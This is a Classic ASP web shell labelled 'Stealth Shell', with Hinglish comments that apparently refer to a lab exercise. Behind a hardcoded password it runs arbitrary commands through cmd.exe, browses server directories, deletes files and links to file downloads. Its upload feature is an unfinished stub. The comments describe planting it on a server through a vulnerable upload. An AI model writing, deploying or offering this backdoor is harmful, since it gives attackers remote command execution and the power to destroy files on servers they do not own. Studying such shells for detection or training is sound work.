<%@ Language=VBScript %>
<%
' CHANGE THIS PASSWORD
Const PASSWORD = "target"

If Request.QueryString("p") <> PASSWORD And Request.Form("p") <> PASSWORD Then
    Response.Write "Access Denied"
    Response.End
End If

Dim objFSO, objShell, strCmd, strOutput, strPath, strAction

Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
Set objShell = Server.CreateObject("WScript.Shell")

strPath = Request("path")
If strPath = "" Then strPath = Server.MapPath(".")

strAction = Request("act")

' CMD EXECUTE
If strAction = "cmd" Then
    strCmd = Request("cmd")
    If strCmd <> "" Then
        Dim objExec
        Set objExec = objShell.Exec("cmd.exe /c " & strCmd)
        strOutput = objExec.StdOut.ReadAll & objExec.StdErr.ReadAll
        Response.Write "<pre>" & Server.HTMLEncode(strOutput) & "</pre>"
    End If
End If

' UPLOAD
If strAction = "upload" And Request.Form("file") <> "" Then
    ' Classic ASP mein native multipart upload nahi hota, isliye simple assume kar rahe (ya component use kar)
    ' Agar unrestricted upload hai to yeh kaam karega lekin better component chahiye real mein
    ' For lab: assume file upload via form, but yeh basic hai
    Response.Write "<pre>Upload not fully implemented without component (use pure.asp or add Persits.AspUpload). Basic listing only.</pre>"
End If

' DELETE
If strAction = "del" Then
    Dim strFile
    strFile = Request("file")
    If objFSO.FileExists(strFile) Then
        objFSO.DeleteFile strFile
        Response.Write "Deleted: " & Server.HTMLEncode(strFile)
    Else
        Response.Write "File not found"
    End If
End If
%>

<html>
<head><title>Classic ASP Stealth Shell</title></head>
<body style="font-family:consolas; background:#000; color:#0f0;">
<h3>Classic ASP File Manager + Shell [Pass: <%=PASSWORD%>]</h3>

<form method="get">
    <input type="hidden" name="p" value="<%=PASSWORD%>">
    Path: <input name="path" value="<%=Server.HTMLEncode(strPath)%>" size="60">
    <input type="submit" value="Browse">
</form>

<h4>Current Dir: <%=Server.HTMLEncode(strPath)%></h4>
<%
If objFSO.FolderExists(strPath) Then
    Dim folder, subf, file
    Set folder = objFSO.GetFolder(strPath)
    
    For Each subf In folder.SubFolders
        Response.Write "[DIR] <a href='?p=" & PASSWORD & "&path=" & Server.URLEncode(subf.Path) & "'>" & subf.Name & "</a><br>"
    Next
    
    For Each file In folder.Files
        Dim fpath : fpath = Server.URLEncode(file.Path)
        Response.Write file.Name & " (" & file.Size & " bytes) | "
        Response.Write "<a href='?p=" & PASSWORD & "&act=del&file=" & fpath & "'>[DEL]</a> | "
        Response.Write "<a href='download.asp?file=" & fpath & "&p=" & PASSWORD & "'>[DOWN]</a><br>"  ' Download link (alag file bana sakta hai)
    Next
Else
    Response.Write "Invalid path"
End If
%>

<h4>Execute Command</h4>
<form method="get">
    <input type="hidden" name="p" value="<%=PASSWORD%>">
    <input type="hidden" name="act" value="cmd">
    CMD: <input name="cmd" size="80" value="whoami">
    <input type="submit" value="Run">
</form>

<h4>Upload (needs upload component like Persits.AspUpload for full, else use vuln upload)</h4>
<!-- Agar lab mein upload vuln hai to alag se upload kar sakta hai, yeh shell manage karega -->
<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="p" value="<%=PASSWORD%>">
    <input type="hidden" name="act" value="upload">
    File: <input type="file" name="file">
    <input type="submit" value="Upload">
</form>

<pre>Current User: <%=objShell.ExpandEnvironmentStrings("%USERNAME%")%></pre>
</body>
</html>

<%
Set objFSO = Nothing
Set objShell = Nothing
%>
